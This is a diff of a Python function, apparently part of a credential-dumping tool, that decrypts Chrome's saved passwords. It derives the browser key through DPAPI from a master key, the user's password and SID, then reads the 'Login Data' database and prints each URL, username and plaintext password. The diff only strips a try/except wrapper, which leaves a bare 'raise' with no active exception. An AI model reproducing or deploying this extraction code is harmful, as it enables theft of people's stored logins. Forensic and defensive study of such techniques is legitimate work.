@@ -35,25 +35,23 @@ def decrypt_password(buff, master_key):
 
 def Chrome_decryptor(dir, folder, mk, password, sid):
     output = ''
-    try:
-        ret = plugins.chrome_dpapi.Dpapi_decrypt(dir, mk, password, sid)
-        ret.main()
-        enc_key = ret.return_key()
-        if enc_key != '':
-            login_db = os.path.join(dir, folder, 'Login Data')
-            conn = sqlite3.connect(login_db)
-            cursor = conn.cursor()
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = decrypt_password(encrypted_password, enc_key)
-                output += f'{"*" * 50}\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n'
-            cursor.close()
-            conn.close()
-            return output
-        else:
-            raise
-    except:
-        return None
+    ret = plugins.chrome_dpapi.Dpapi_decrypt(dir, mk, password, sid)
+    ret.main()
+    enc_key = ret.return_key()
+    if enc_key != '':
+        login_db = os.path.join(dir, folder, 'Login Data')
+        conn = sqlite3.connect(login_db)
+        cursor = conn.cursor()
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password(encrypted_password, enc_key)
+            output += f'{"*" * 50}\nURL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n'
+        cursor.close()
+        conn.close()
+        return output
+    else:
+        raise
+
